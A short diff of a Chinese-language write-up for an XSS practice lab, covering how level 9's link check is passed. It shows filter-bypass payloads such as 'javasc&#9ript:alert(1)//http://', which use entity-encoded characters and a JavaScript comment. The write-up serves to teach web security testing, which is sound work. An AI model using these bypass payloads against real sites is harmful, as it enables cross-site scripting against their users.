@@ -60,7 +60,7 @@ payload：javasc&#13ript:alert(1)
 
 ## level9
 测试看到a标签考虑使用<a href="javascript:alert(1)"></a>，页面有回显的超链接，想办法将script转码一下。</br>
-但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用http://才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释http://</br>
+但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用<text>http://才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释http://</text></br>
 ```java
 payload：javasc&#9ript:alert(1)/*http://*/
 payload：javasc&#9ript:alert(1)//http://
